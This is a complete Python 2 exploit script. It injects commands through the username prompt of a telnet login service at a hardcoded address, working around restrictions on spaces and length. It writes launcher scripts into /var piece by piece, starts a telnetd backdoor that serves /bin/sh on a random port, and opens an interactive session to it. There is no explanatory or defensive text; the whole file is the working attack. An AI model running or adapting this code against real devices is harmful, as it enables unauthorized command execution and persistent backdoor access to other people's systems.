#!/usr/bin/env python2
import telnetlib
import re
import random
import string


# Split string into chunks, of which each is <= length
def chunkstring(s, length):
    return (s[0+i:length+i] for i in range(0, len(s), length))

# Split strings based on MAX_LEN. Encode any newlines and/or spaces.
def split_script(script):
    MAX_LEN = 28 - len('printf${IFS}"">>/var/a') - 1
    completed = []
    temp = re.split('(\n)', script)
    for content in temp:
        if len(content) != 0:
            for s in re.split('( )', content):
                if ' ' in s:
                    s = '\\x20'
                if '\n' in s:
                    s = ['\\n']
                else:
                    s = list(chunkstring(s, MAX_LEN))
                completed.append(s)

    return [item for sublist in completed for item in sublist] # Flatten nested list items

# Execute each command via the username parameter
def do_cmd(host, command):
    tn = telnetlib.Telnet(host)
    modCommand = command.replace(' ', '${IFS}') # Spaces aren't allowed, replace with ${IFS}
    tn.read_until("login: ")
    tn.write("`%s`\n" % modCommand)
    print "Sent command: %s\n    modified: %s\n        size: %d" % (command, modCommand, len(modCommand))
    tn.read_until("Password: ")
    tn.write(" " + "\n")
    tn.read_until("incorrect")
    tn.close()

# Write script to writable directory on host
def write_script(host, script, t_dir, t_name):
    print "[*] Writing shell script to host..."
    i = 0
    for token in split_script(script):
        carat = '>' if i == 0 else '>>'
        do_cmd(host, 'printf "%s"%s%s/%s' % (token, carat, t_dir, t_name))
        i+=1

    do_cmd(host, 'chmod +x %s/%s' % (t_dir,t_name))
    print "[*] Script written to: %s/%s\n" % (t_dir,t_name)

# Attempt to connect to newly-created backdoor
def backdoor_connect(host,port):
    print "[*] Attempting to connect to backdoor @ %s:%d" % (host, port)
    tn = telnetlib.Telnet(host, port)
    tn.interact()

def main():
    host = "192.168.127.253"
    port = random.randint(2048,4096)

    w_dir = '/var' # writable directory
    s_name = random.choice(string.ascii_uppercase) # /bin/sh launcher
    t_name = s_name.lower() # telnetd launcher

    # Need a shell launcher script to launch /bin/sh because
    # telnetd adds a '-h' option to the login command
    shell_launcher = "#!/bin/sh\nexec sh"

    # Launch telnetd with the launcher script as the login
    # command to execute
    telnetd_launcher = "#!/bin/sh\ntelnetd -p%d -l%s/%s" % (port, w_dir,s_name)

    write_script(host, shell_launcher, w_dir, s_name)
    write_script(host, telnetd_launcher, w_dir, t_name)

    # Execute telnetd script and attempt to connect
    do_cmd(host, '.%s/%s' % (w_dir,t_name))
    backdoor_connect(host, port)

if __name__ == "__main__":
    main()